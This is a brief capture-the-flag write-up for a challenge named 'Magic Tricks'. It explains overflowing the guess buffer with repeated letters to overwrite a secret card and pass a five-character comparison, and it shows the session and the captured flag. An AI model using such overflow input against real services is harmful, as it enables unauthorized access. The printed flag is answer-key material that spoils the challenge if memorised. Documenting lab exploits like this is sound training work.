# Magic Tricks

If all card tricks are supposedly based on distraction, you shouldn't be able to perform them on a computer?

```
nc ctf.wackattack.eu 5000
```

[⬇️ magic-trick.tgz](./magic-trick.tgz)

# Writeup

Saw that this was a buffer overflow one, I can easily overwrite the secret card to be whatever I want to be, strcomp only checks the first 5 letters so if I just blast equal letters till I overflow + 5 then I get the flag

```bash
$ nc ctf.wackattack.eu 5000
I have selected a playing card, there's no way you will guess what it is!
Enter your guess: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You guessed aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, the secret card was the ... aaaaaaaaaaaaaaaaaaaaa (hah)
wack{I_v0w_t0_st0p_m4king_puns_4nd_st4rt_s3curing_buff3r5}
```

# Flag

```
wack{I_v0w_t0_st0p_m4king_puns_4nd_st4rt_s3curing_buff3r5}
```
